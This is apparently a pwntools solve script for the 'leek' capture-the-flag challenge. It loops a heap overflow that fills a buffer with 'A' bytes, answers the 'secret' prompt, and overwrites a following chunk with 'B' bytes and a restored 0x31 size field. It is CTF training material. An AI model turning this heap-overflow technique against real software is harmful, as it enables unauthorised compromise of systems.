#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *

elf = context.binary = ELF('leek', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'challs.actf.co'
	port = int(args.PORT or 31310)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
tbreak main
b *0x4015D9
b *0x401631
b *0x40169A
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

for i in range(0x64):
	sla(b'):', flat(
		0x40 * b'A'
	))

	sa(b'my secret? ', b'A' * 0x20)

	sla(b'Say what you want: ', flat(
		b'B' * 0x18,
		p64(0x31)
	))


ia()
